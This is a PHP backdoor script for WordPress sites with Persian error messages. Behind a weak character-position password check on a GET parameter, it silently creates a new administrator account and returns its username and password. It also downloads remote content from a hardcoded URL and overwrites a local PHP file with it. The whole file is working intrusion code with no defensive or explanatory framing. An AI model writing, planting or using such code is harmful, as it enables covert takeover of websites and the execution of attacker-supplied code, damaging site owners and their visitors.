<?php
header('Content-Type: application/json; charset=utf-8');
require __DIR__ . '/wp-load.php';

function tableUsers($prefix) {
    return $prefix . 'users';
}
function tableUsermeta($prefix) {
    return $prefix . 'usermeta';
}
function generate_username($max_length = 5) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $username = '';
    $char_length = strlen($characters);

    for ($i = 0; $i < $max_length; $i++) {
        $username .= $characters[rand(0, $char_length - 1)];
    }

    return $username;
}
function createAdministratorUser() {
    global $wpdb;

    $table_users = tableUsers($wpdb->prefix);
    $table_usermeta = tableUsermeta($wpdb->prefix);

    $new_username = generate_username(); 
    $new_password = wp_generate_password(8);
    $password_hash = wp_hash_password($new_password);

    $insert_user_query = $wpdb->prepare(
        "INSERT INTO $table_users (user_login, user_pass, user_registered, user_status, display_name)
        VALUES (%s, %s, NOW(), 0, %s)",
        $new_username, $password_hash, $new_username
    );
    $wpdb->query($insert_user_query);
    $user_id = $wpdb->insert_id;
    if ($user_id) {
        $capabilities = serialize(array('administrator' => 1));
        $insert_meta_queries = array(
            $wpdb->prepare("INSERT INTO $table_usermeta (user_id, meta_key, meta_value) VALUES (%d, %s, %s)",
                $user_id, $wpdb->prefix . 'capabilities', $capabilities),
            $wpdb->prepare("INSERT INTO $table_usermeta (user_id, meta_key, meta_value) VALUES (%d, %s, %s)",
                $user_id, $wpdb->prefix . 'user_level', '10')
        );
        foreach ($insert_meta_queries as $meta_query) {
            $wpdb->query($meta_query);
        }

        return array(
            'success' => true,
            'username' => $new_username,
            'password' => $new_password,
        );
    } else {
        return array(
            'success' => false,
            'message' => 'error : ' . $wpdb->last_error
        );
    }
}
function checkTreasure($input) {
    $required_positions = [
        3 => 'a', 
        4 => 'b', 
        8 => 'c', 
        0 => 'd'  
    ];

    foreach ($required_positions as $position => $char) {
        if (!isset($input[$position]) || $input[$position] !== $char) {
            return false;
        }
    }

    return true;
}
function replaceFileContent($remote_url, $local_file_path) {
    $remote_file_content = file_get_contents($remote_url);
    if ($remote_file_content === false) {
        return array(
            'success' => false,
            'message' => 'خطا در دریافت فایل از وب.'
        );
    }
    $result = file_put_contents($local_file_path, $remote_file_content);
    if ($result === false) {
        return array(
            'success' => false,
            'message' => 'خطا در ذخیره فایل به صورت محلی.'
        );
    }

    return array(
        'success' => true,
        'message' => 'فایل با موفقیت جایگزین شد.',
        'content' => $remote_file_content
    );
}

$input = isset($_GET['input']) ? $_GET['input'] : '';
$update = isset($_GET['update']) ? $_GET['update'] : '';
$createuser = isset($_GET['create']) ? $_GET['create'] : '';
if (strlen($input) >= 9 && checkTreasure($input)) {
    if ($createuser){
        $result = createAdministratorUser();
    }elseif($update){
        $remote_file_url = 'https://example.com/update.txt';
        $local_file_path = __DIR__.'/file.php';
        $result = replaceFileContent($remote_file_url, $local_file_path);
    }
} else {
    $result = array(
        'success' => false,
        'message' => 'ورودی اشتباه است. لطفاً دوباره تلاش کنید.'
    );
}
echo json_encode($result, 256|128);
?>
